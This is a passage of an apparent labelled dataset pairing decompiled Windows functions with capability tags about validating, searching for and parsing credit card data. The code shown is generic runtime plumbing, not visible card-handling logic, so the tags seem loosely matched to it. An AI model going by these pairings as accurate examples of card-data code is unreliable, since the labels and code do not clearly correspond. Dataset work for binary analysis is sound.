auStack72, iVar4);\n                    uVar6 = s2[1];\n                    iVar4 = arg2[1];\n                }\n            }\n        }\n        else {\n            uVar3 = arg2[2];\n            uVar6 = 0xffffffffffffffff;\n            if (iVar9 != -1) {\n                sub.msvcrt.dll_memcpy(puVar1, puVar5);\n                uVar6 = s2[1];\n            }\n            *s2 = puVar8;\n            *arg2 = puVar1;\n            s2[2] = uVar3;\n            iVar4 = arg2[1];\n        }\n    }\n    else {\n        uVar6 = s2[2];\n        if (puVar1 == puVar8) {\n            iVar4 = -1;\n            if (arg2[1] != -1) {\n                puVar5 = sub.msvcrt.dll_memcpy(puVar5, puVar1);\n                iVar4 = arg2[1];\n            }\n            *arg2 = puVar7;\n            *s2 = puVar5;\n        }\n        else {\n            *s2 = puVar8;\n            *arg2 = puVar7;\n            s2[2] = arg2[2];\n            iVar4 = arg2[1];\n        }\n        arg2[2] = uVar6;\n        uVar6 = s2[1];\n    }\n    s2[1] = iVar4;\n    arg2[1] = uVar6;\n    return;\n}\n",
        "token_count": 909
    },
    "1400b331": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400b3310(int64_t arg1, int64_t arg2)\n\n{\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int32_t *piVar10;\n    ulong *puVar11;\n    uint uStack32;\n    \n    uVar7 = *(arg2 + 8);\n    uVar6 = *(arg2 + 0x10);\n    *(arg1 + 8) = uVar7;\n    *(arg1 + 0x10) = uVar6;\n    *(arg1 + 0x18) = *(arg2 + 0x18);\n    *(arg1 + 0x20) = *(arg2 + 0x20);\n    uVar6 = *(arg2 + 0x28);\n    *(arg2 + 0x28) = 0;\n    *(arg1 + 0x28) = uVar6;\n    if ((*(arg1 + 200) != arg1 + 0x40) && (*(arg1 + 200) != 0)) {\n        fcn.1400bc6b0(uVar7);\n    }\n    iVar9 = *(arg2 + 200);\n    if (iVar9 == arg2 + 0x40) {\n        *(arg1 + 200) = arg1 + 0x40;\n        iVar9 = 0;\n        *(arg1 + 0xc0) = 8;\n        do {\n            puVar11 = *(arg2 + 200) + iVar9;\n            uVar6 = *puVar11;\n            uVar7 = puVar11[1];\n            *puVar11 = 0;\n            *(puVar11 + 1) = 0;\n            iVar8 = *(arg1 + 200);\n            *(iVar8 + iVar9) = uVar6;\n            uStack32 = uVar7;\n            *(iVar8 + 8 + iVar9) = uStack32;\n            iVar9 = iVar9 + 0x10;\n        } while (iVar9 != 0x80);\n    }\n    else {\n        *(arg2 + 200) = arg2 + 0x40;\n        *(arg1 + 200) = iVar9;\n        uVar4 = *(arg2 + 0xc0);\n        *(arg2 + 0xc0) = 8;\n        *(arg1 + 0xc0) = uVar4;\n    }\n    piVar10 = *0x140108760;\n    ppiVar1 = arg2 + 0xd0;\n    ppiVar2 = arg1 + 0xd0;\n    piVar5 = *ppiVar1;\n    if (piVar5 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            *piVar5 = *piVar5 + 1;\n        }\n        else {\n            LOCK();\n            *piVar5 = *piVar5 + 1;\n            piVar10 = *0x140108760;\n        }\n    }\n    piVar5 = *ppiVar2;\n    if (piVar5 != piVar10) {\n        if (**0x14010fc90 == 0) {\n            iVar3 = *piVar5;\n            *piVar5 = iVar3 + -1;\n        }\n        else {\n            LOCK();\n            iVar3 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n        }\n        if (iVar3 == 1) {\n            fcn.1400a5480(piVar5);\n            fcn.1400bc6c0(piVar5);\n            *ppiVar2 = *ppiVar1;\n            return;\n        }\n    }\n    *ppiVar2 = *ppiVar1;\n    return;\n}\n",
        "token_count": 866
    },
    "1400b36e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400b36e0(ulong *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar uStack25;\n    \n    *arg1 = 0x1401176b0;\n    iVar1 = *arg2;\n    if (*(iVar1 + -8) < 0) {\n        uVar2 = fcn.14007c020(iVar1 + -0x18, &uStack25, 0);\n        arg1[1] = uVar2;\n        return;\n    }\n    if (**0x14010fc90 == 0) {\n        *(iVar1 + -8) = *(iVar1 + -8) + 1;\n        arg1[1] = iVar1;\n        return;\n    }\n    LOCK();\n    *(iVar1 + -8) = *(iVar1 + -8) + 1;\n    arg1[1] = iVar1;\n    return;\n}\n",
        "token_count": 212
    },
    "1400b794": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400b7940(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar uStack9;\n    \n    if (**arg1 != 0x1400b37f0) {\n    // WARNING: Could not recover jumptable at 0x0001400b79c5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (***arg1)();\n        return;\n    }\n    *arg1 = 0x1401176b0;\n    iVar3 = arg1[1];\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(iVar3 + -8);\n        *(iVar3 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(iVar3 + -0x18, &uStack9);\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "1400bd97": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint32_t fcn.1400bd970(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    ulong *arg1_00;\n    ulong uVar2;\n    uint64_t uStack40;\n    ulong uStack32;\n    \n    arg1_00 = fcn.1400bc7f0(0x30);\n    uStack32 = 0x1401072a0;\n    uStack40 = 1;\n    if (arg2 != 0) {\n        uStack32 = fcn.1400a20f0();\n        uStack40 = arg2;\n    }\n    fcn.140083230(arg1_00, &uStack40, arg1);\n    *arg1_00 = 0x140117c30;\n    uVar2 = fcn.140027080(arg1_00);\n    fcn.1400b7a50(arg1_00 + 4, uVar2);\n    uVar2 = fcn.1400bcdb0(arg1_00, 0x140112940, 0x140089280);\n    *arg1_00 = 0x140117680;\n    fcn.1400838b0(arg1_00);\n    fcn.1400bcb10(arg1_00);\n    fcn.140014f30(uVar2);\n    iVar1 = sub.msvcrt.dll__onexit(0x1400bcfe0);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 324
    },
    "140022d8": {
        "rules": [
            "search for credit card data/546f8dc683b8415fa126b38355d21de5",
            "parse credit card information/2fba96855ce44cd2afbbefaf4df20b4d"
        ],
        "decompiled_code": "\nvoid fcn.140022d80(uint32_t *arg1, ulong arg2, ulong arg3)\n\n{\n    if (arg3 < 0x218) {\n        if ((-1 < arg3) && (arg3 < 0x218)) {\n    // switch table (536 cases) at 0x14010e620\n            switch(*(arg3 * 4 + 0x14010e620) + 0x14010e620) {\n            case 0x1400231da:\n                *arg1 = 1;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400231ec:\n                *arg1 = 0x14;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400231fe:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023210:\n                *arg1 = 0;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023222:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023234:\n                *arg1 = 0x73;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023246:\n                *arg1 = 0x20;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023258:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002326a:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002327c:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002328e:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400232a0:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400232b2:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400232c4:\n                *arg1 = 0x26;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400232d6:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400232e8:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400232fa:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002330c:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002331e:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023330:\n                *arg1 = 0x11;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023342:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023354:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023366:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023378:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002338a:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002339c:\n                *arg1 = 0x29;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400233ae:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400233c0:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400233d2:\n                *arg1 = 3;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400233e4:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400233f6:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023408:\n                *arg1 = 0x28;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002341a:\n                *arg1 = 0x17;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002342c:\n                *arg1 = 0x1c;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002343e:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023450:\n                *arg1 = 0x20;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023462:\n                *arg1 = 4;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023474:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023486:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023498:\n                *arg1 = 1;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400234aa:\n                *arg1 = 0x11;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400234bc:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400234ce:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400234e0:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400234f2:\n                *arg1 = 0x28;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023504:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023516:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023528:\n                *arg1 = 0x28;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002353a:\n                *arg1 = 0x1c;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002354c:\n                *arg1 = 0x27;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002355e:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023570:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023582:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023594:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400235a6:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400235b8:\n                *arg1 = 0x13;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400235ca:\n                *arg1 = 0x1e;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400235dc:\n                *arg1 = 0x12;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400235ee:\n                *arg1 = 0x13;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023600:\n                *arg1 = 0xc;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023612:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023624:\n                *arg1 = 0xc;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023636:\n                *arg1 = 9;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023648:\n                *arg1 = 0xd;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002365a:\n                *arg1 = 0x18;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002366c:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002367e:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023690:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n        }\n    }\n    else if (arg3 < 0x4ca) {\n        if (arg3 < 0x44c) {\n            if (arg3 < 0x3f1) {\n                if ((0x3e3 < arg3) && (arg3 - 0x3e4 < 0xd)) {\n    // switch table (13 cases) at 0x14010ee80\n                    switch(*((arg3 - 0x3e4) * 4 + 0x14010ee80) + 0x14010ee80) {\n                    case 0x140022f70:\n                        *arg1 = 0x16;\n                        *(arg1 + 2) = 0x1401072c0;\n                        return;\n                    case 0x140022f88:\n                        *arg1 = 6;\n                        *(arg1 + 2) = 0x1401072c0;\n                        return;\n                    case 0x140022fa0:\n                        *arg1 = 0xe;\n                        *(arg1 + 2) = 0x1401072c0;\n                        return;\n                    case 0x140022fb8:\n                        *arg1 = 0xb;\n                        *(arg1 + 2) = 0x1401072c0;\n                        return;\n                    case 0x140022fd0:\n                        *arg1 = 0xb;\n                        *(arg1 + 2) = 0x1401072c0;\n                        return;\n                    }\n                }\n            }\n            else {\n                if (arg3 == 0x41d) {\n                    *arg1 = 0x10;\n                    *(arg1 + 2) = 0x1401072c0;\n                    return;\n                }\n                if (arg3 == 0x42b) {\n                    *arg1 = 0xe;\n                    *(arg1 + 2) = 0x1401072c0;\n                    return;\n                }\n            }\n        }\n        else if (arg3 - 0x44c < 0x7e) {\n    // switch table (126 cases) at 0x14010efc8\n            switch(*((arg3 - 0x44c) * 4 + 0x14010efc8) + 0x14010efc8) {\n            case 0x1400230ba:\n                *arg1 = 0x6b;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400230cc:\n                *arg1 = 4;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400230de:\n                *arg1 = 0x13;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400230f0:\n                *arg1 = 0x1c;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023102:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023114:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023126:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023138:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002314a:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002315c:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x14002316e:\n                *arg1 = 0x1f;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023180:\n                *arg1 = 0x24;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023192:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400231a4:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400231b6:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400231c8:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n        }\n    }\n    else if (arg3 < 0x5b5) {\n        if (arg3 < 0x570) {\n            if (arg3 == 0x522) {\n                *arg1 = 1;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n            if (arg3 == 0x534) {\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n        }\n        else if (arg3 - 0x570 < 0x45) {\n    // switch table (69 cases) at 0x14010eeb4\n            switch(*((arg3 - 0x570) * 4 + 0x14010eeb4) + 0x14010eeb4) {\n            case 0x140022fe8:\n                *arg1 = 0x11;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023000:\n                *arg1 = 0x1b;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023018:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023030:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023048:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023060:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023078:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x140023090:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            case 0x1400230a8:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n        }\n    }\n    else {\n        if (arg3 == 0x962) {\n            *arg1 = 0xb;\n            *(arg1 + 2) = 0x1401072c0;\n            return;\n        }\n        if (arg3 < 0x963) {\n            if (arg3 == 0x89a) {\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n            if (arg3 == 0x961) {\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n            if (arg3 == 0x718) {\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n        }\n        else {\n            if (arg3 == 0x964) {\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n            if (arg3 == 0x2095) {\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1401072c0;\n                return;\n            }\n        }\n    }\n    *arg1 = arg3;\n    *(arg1 + 2) = arg2;\n    return;\n}\n",
        "token_count": 4836
    },
    "140020d7": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nuint64_t fcn.140020d70(char *arg1, int64_t noname_1, char *arg3, char **arg4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    char *arg1_00;\n    char *arg2;\n    \n    cVar2 = *arg3;\n    pcVar1 = arg1 + noname_1 + -1;\n    arg1_00 = arg1;\n    if (cVar2 == '\\0') {\ncode_r0x000140020e80:\n        uVar4 = 0;\ncode_r0x000140020e24:\n        *arg1_00 = '\\0';\n        return uVar4;\n    }\n    if (arg1 < pcVar1) {\n        do {\n            if (cVar2 != '%') goto code_r0x000140020da0;\n            cVar2 = arg3[1];\n            if (cVar2 == 's') {\n                pcVar5 = *arg4;\n                arg4 = arg4 + 1;\n                cVar2 = *pcVar5;\n                if (cVar2 != '\\0') {\n                    arg2 = arg1_00;\n                    if (pcVar1 <= arg1_00) {\ncode_r0x000140020e75:\n                        fcn.140021a70(arg1, arg2);\n                        goto code_r0x000140020e80;\n                    }\n                    while( true ) {\n                        pcVar5 = pcVar5 + 1;\n                        *arg1_00 = cVar2;\n                        arg1_00 = arg1_00 + 1;\n                        cVar2 = *pcVar5;\n                        if (cVar2 == '\\0') break;\n                        arg2 = pcVar1;\n                        if (pcVar1 == arg1_00) goto code_r0x000140020e75;\n                    }\n                }\n                arg3 = arg3 + 2;\ncode_r0x000140020dad:\n                cVar2 = *arg3;\n            }\n            else {\n                if (cVar2 != 'z') {\n                    if (cVar2 != '%') goto code_r0x000140020da0;\n                    arg3 = arg3 + 1;\ncode_r0x000140020da3:\n                    *arg1_00 = cVar2;\n                    arg3 = arg3 + 1;\n                    arg1_00 = arg1_00 + 1;\n                    goto code_r0x000140020dad;\n                }\n                if (arg3[2] != 'u') {\ncode_r0x000140020da0:\n                    cVar2 = *arg3;\n                    goto code_r0x000140020da3;\n                }\n                pcVar5 = *arg4;\n                arg4 = arg4 + 1;\n                iVar3 = fcn.140020cd0(arg1_00, pcVar1 - arg1_00, pcVar5);\n                if (iVar3 < 1) break;\n                arg3 = arg3 + 3;\n                arg1_00 = arg1_00 + iVar3;\n                cVar2 = *arg3;\n            }\n            if (cVar2 == '\\0') {\n                uVar4 = arg1_00 - arg1;\n                goto code_r0x000140020e24;\n            }\n        } while (arg1_00 < pcVar1);\n    }\n    fcn.140021a70(arg1, arg1_00);\n    return *(arg1 + 0x40);\n}\n",
        "token_count": 784
    },
    "1400340c": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7",
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.1400340c0(uint *arg1, ulong arg2, int64_t **noname_2, int64_t **arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    char cVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int64_t arg_88h;\n    int64_t *arg1_00;\n    uint64_t noname_10;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    int32_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    int64_t *piVar15;\n    uint8_t *puVar16;\n    bool bVar17;\n    bool bVar18;\n    int64_t *piVar19;\n    bool bVar20;\n    char cVar21;\n    uint8_t uVar22;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t in_stack_00000040;\n    uint32_t *in_stack_00000048;\n    uint32_t *in_stack_fffffffffffffe00;\n    uint32_t *noname_8;\n    uint32_t uVar23;\n    int64_t **in_stack_fffffffffffffe18;\n    int64_t **ppiVar24;\n    code *arg_78h;\n    int64_t *piVar25;\n    int64_t *arg_80h;\n    uint *in_stack_fffffffffffffe38;\n    uint *arg3;\n    int64_t *piStack440;\n    int64_t *piStack432;\n    uint uStack424;\n    uint uStack420;\n    uint32_t uStack416;\n    uint uStack412;\n    int64_t *piStack408;\n    uint32_t uStack400;\n    ulong uStack392;\n    uint32_t uStack384;\n    uint uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    char *pcStack360;\n    char *pcStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    \n    piVar15 = arg4[1];\n    uStack392 = *noname_2;\n    uStack384 = *(noname_2 + 1);\n    uStack380 = *(noname_2 + 0xc);\n    piVar19 = *arg4;\n    piVar25 = piVar15;\n    arg_88h = fcn.1400b9730(in_stack_00000028 + 0xd0);\n    arg1_00 = fcn.1400b97f0(in_stack_00000028 + 0xd0);\n    noname_10 = sub.msvcrt.dll_strlen();\n    uVar11 = uStack384;\n    iVar12 = piVar15;\n    uVar13 = 0;\n    uStack368 = 0;\n    uVar23 = 0;\n    arg_78h = 0x14002baf0;\n    piVar15 = uStack392;\n    while( true ) {\n        bVar20 = uVar11 == -1;\n        bVar17 = piVar15 != NULL && bVar20;\n        ppiVar24 = in_stack_fffffffffffffe18;\n        arg_80h = piVar25;\n        bVar10 = bVar20;\n        if (bVar17) {\n            if ((piVar15[2] < piVar15[3]) || (iVar6 = (**(*piVar15 + 0x48))(),  iVar6 != -1)) {\n                ppiVar24 = in_stack_fffffffffffffe18;\n                arg_80h = piVar25;\n                bVar10 = false;\n            }\n            else {\n                uStack392 = NULL;\n                ppiVar24 = in_stack_fffffffffffffe18;\n                arg_80h = piVar25;\n                bVar10 = bVar17;\n            }\n        }\n        bVar17 = iVar12 == -1;\n        if ((piVar19 == NULL) || (!bVar17)) {\n            bVar10 = bVar10 ^ bVar17;\n        }\n        else if ((piVar19[3] <= piVar19[2]) && (iVar6 = (**(*piVar19 + 0x48))(),  iVar6 == -1)) {\n            bVar10 = bVar10 ^ 1;\n            piVar19 = NULL;\n        }\n        if ((noname_10 <= uVar13) || (!bVar10)) break;\n        if (uVar23 != 0) goto code_r0x000140034535;\n        in_stack_fffffffffffffe18 = in_stack_00000040 + uVar13;\n        uVar4 = *in_stack_fffffffffffffe18;\n        uVar22 = *(arg1_00 + uVar4 + 0x139);\n        if (uVar22 == 0) {\n            uVar22 = uVar4;\n            if (*(*arg1_00 + 0x40) != arg_78h) {\n                uVar22 = (**(*arg1_00 + 0x40))();\n                ppiVar24 = in_stack_fffffffffffffe18;\n            }\n            if (uVar22 != 0) {\n                *(arg1_00 + uVar4 + 0x139) = uVar22;\n                goto code_r0x000140034250;\n            }\ncode_r0x000140034258:\n            piVar15 = uStack392;\n            uVar14 = uVar13;\n            if ((*(arg1_00[6] + *in_stack_fffffffffffffe18 * 2) & 0x20) != 0) {\n                do {\n                    uVar22 = uVar11 == -1;\n                    uVar4 = piVar15 != NULL && uVar22;\n                    in_stack_fffffffffffffe18 = ppiVar24;\n                    if (uVar4) {\n                        if (piVar15[3] <= piVar15[2]) {\n                            ppiVar24 = ppiVar24 & 0xffffffffffffff00 | uVar4;\n                            iVar6 = (**(*piVar15 + 0x48))();\n                            uVar4 = ppiVar24;\n                            if (iVar6 == -1) {\n                                piVar15 = NULL;\n                                uStack392 = NULL;\n                                in_stack_fffffffffffffe18 = ppiVar24;\n                                uVar22 = uVar4;\n                                uVar4 = 0;\n                                goto joined_r0x00014003433b;\n                            }\n                        }\n                        in_stack_fffffffffffffe18 = ppiVar24;\n                        uVar22 = 0;\n                    }\njoined_r0x00014003433b:\n                    bVar10 = bVar17;\n                    if (piVar19 != NULL && bVar17) {\n                        bVar10 = piVar19 != NULL;\n                        if (piVar19[2] < piVar19[3]) {\n                            bVar10 = false;\n                        }\n                        else {\n                            in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar4;\n                            iVar6 = (**(*piVar19 + 0x48))();\n                            uVar4 = in_stack_fffffffffffffe18;\n                            if (iVar6 == -1) {\n                                piVar19 = NULL;\n                            }\n                            bVar10 = iVar6 == -1 && (bVar10 && bVar17);\n                        }\n                    }\n                    piVar25 = arg_80h;\n                    if (bVar10 == uVar22) goto code_r0x000140034317;\n                    uVar13 = uVar11;\n                    if (uVar4 == 0) {\ncode_r0x000140034352:\n                        piVar25 = arg_80h;\n                        if ((*(arg1_00[6] + (uVar13 & 0xff) * 2) & 0x20) == 0) goto code_r0x000140034317;\n                        puVar9 = piVar15[2];\n                        if (puVar9 < piVar15[3]) goto code_r0x00014003436d;\n                        (**(*piVar15 + 0x50))();\n                    }\n                    else {\n                        puVar9 = piVar15[2];\n                        if (piVar15[3] <= puVar9) {\n                            uVar13 = 